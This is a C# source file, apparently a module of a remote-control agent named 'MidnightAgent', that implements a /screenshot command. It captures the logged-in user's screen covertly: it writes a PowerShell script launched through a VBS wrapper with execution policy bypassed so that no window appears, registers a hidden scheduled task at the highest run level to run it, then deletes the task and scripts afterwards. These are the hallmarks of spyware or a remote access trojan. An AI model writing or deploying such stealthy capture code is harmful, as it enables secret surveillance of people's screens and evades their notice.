using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /screenshot - Capture screen via user-session helper task
    /// </summary>
    public class ScreenshotFeature : IFeature
    {
        public string Command => "screenshot";
        public string Description => "Capture screenshot";
        public string Usage => "/screenshot";

        private const string HELPER_TASK_NAME = "MidnightScreenHelper";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");

            try
            {
                if (CaptureViaHelperTask(tempPath))
                {
                    return Task.FromResult(FeatureResult.File(tempPath, "📸 Screenshot"));
                }

                return Task.FromResult(FeatureResult.Fail("❌ Screenshot failed: Cannot access user desktop"));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"❌ Screenshot failed: {ex.Message}"));
            }
        }

        /// <summary>
        /// Create and run a helper scheduled task that runs as the logged-in user
        /// with InteractiveToken to access the user's desktop session
        /// </summary>
        private bool CaptureViaHelperTask(string outputPath)
        {
            string psScriptPath = null;
            string xmlPath = null;
            string vbsPath = null;

            try
            {
                // 1. Find the logged-in username from explorer.exe
                string loggedInUser = GetLoggedInUser();
                if (string.IsNullOrEmpty(loggedInUser))
                    return false;

                // 2. Create PowerShell capture script
                psScriptPath = Path.Combine(Path.GetTempPath(), $"screencap_{Guid.NewGuid():N}.ps1");
                string psScript = $@"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -TypeDefinition @""
    using System;
    using System.Runtime.InteropServices;
    public class User32 {{
        [DllImport(""user32.dll"")]
        public static extern bool SetProcessDPIAware();
    }}
""@
[User32]::SetProcessDPIAware()
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save('{outputPath.Replace("'", "''")}', [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
";
                File.WriteAllText(psScriptPath, psScript);

                // 2.5 Create VBS wrapper to run PowerShell TRULY hidden (no blink)
                vbsPath = Path.Combine(Path.GetTempPath(), $"wrap_{Guid.NewGuid():N}.vbs");
                string vbsScript = $@"CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -File """"{psScriptPath}"""""", 0, True";
                File.WriteAllText(vbsPath, vbsScript);

                // 3. Create XML task definition with InteractiveToken
                xmlPath = Path.Combine(Path.GetTempPath(), $"task_{Guid.NewGuid():N}.xml");
                string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Description>Screen Capture Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>{loggedInUser}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>//B //Nologo ""{vbsPath}""</Arguments>
    </Exec>
  </Actions>
</Task>";
                File.WriteAllText(xmlPath, taskXml);

                // 4. Create and run the task
                RunSchtasks($"/Create /XML \"{xmlPath}\" /TN \"{HELPER_TASK_NAME}\" /F");
                RunSchtasks($"/Run /TN \"{HELPER_TASK_NAME}\"");

                // 5. Wait for screenshot (up to 20s, accept any non-empty PNG)
                for (int i = 0; i < 40; i++)
                {
                    Thread.Sleep(500);
                    if (File.Exists(outputPath) && new FileInfo(outputPath).Length > 1024)
                    {
                        Cleanup(psScriptPath, xmlPath, vbsPath);
                        return true;
                    }
                }

                Cleanup(psScriptPath, xmlPath, vbsPath);
                return false;
            }
            catch
            {
                Cleanup(psScriptPath, xmlPath, vbsPath);
                return false;
            }
        }

        private string GetLoggedInUser()
        {
            // Method 1: WMI via explorer.exe owner
            try
            {
                foreach (var proc in Process.GetProcessesByName("explorer"))
                {
                    string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {proc.Id}";
                    using (var searcher = new System.Management.ManagementObjectSearcher(query))
                    {
                        foreach (System.Management.ManagementObject obj in searcher.Get())
                        {
                            string[] ownerInfo = new string[] { string.Empty, string.Empty };
                            if (Convert.ToInt32(obj.InvokeMethod("GetOwner", ownerInfo)) == 0)
                            {
                                string domain = ownerInfo[1];
                                string user = ownerInfo[0];
                                if (!string.IsNullOrEmpty(user))
                                    return string.IsNullOrEmpty(domain) ? user : $"{domain}\\{user}";
                            }
                        }
                    }
                }
            }
            catch { }

            // Method 2: quser command
            try
            {
                var p = Process.Start(new ProcessStartInfo
                {
                    FileName = "quser",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                });
                string quserOut = p.StandardOutput.ReadToEnd();
                p.WaitForExit(3000);
                // Parse first Active session username
                foreach (var line in quserOut.Split('\n').Skip(1))
                {
                    if (line.Contains("Active") || line.Contains("rdp-tcp"))
                    {
                        string trimmed = line.Trim();
                        // quser output: >username  sessionname  id  state ...
                        string[] parts = trimmed.TrimStart('>').Split(new char[]{' '}, StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length > 0)
                            return parts[0].TrimStart('>');
                    }
                }
            }
            catch { }

            // Method 3: Environment.UserName (works when running as logged-in user)
            try
            {
                string envUser = Environment.UserName;
                if (!string.IsNullOrEmpty(envUser) &&
                    !envUser.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    string domain = Environment.UserDomainName;
                    return string.IsNullOrEmpty(domain) || domain == envUser
                        ? envUser
                        : $"{domain}\\{envUser}";
                }
            }
            catch { }

            return null;
        }

        private void RunSchtasks(string arguments)
        {
            using (var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true
            }))
            {
                proc?.WaitForExit(10000);
            }
        }

        private void Cleanup(string psScriptPath, string xmlPath, string vbsPath)
        {
            try { RunSchtasks($"/Delete /TN \"{HELPER_TASK_NAME}\" /F"); } catch { }
            try { if (psScriptPath != null) File.Delete(psScriptPath); } catch { }
            try { if (xmlPath != null) File.Delete(xmlPath); } catch { }
            try { if (vbsPath != null) File.Delete(vbsPath); } catch { }
        }
    }
}
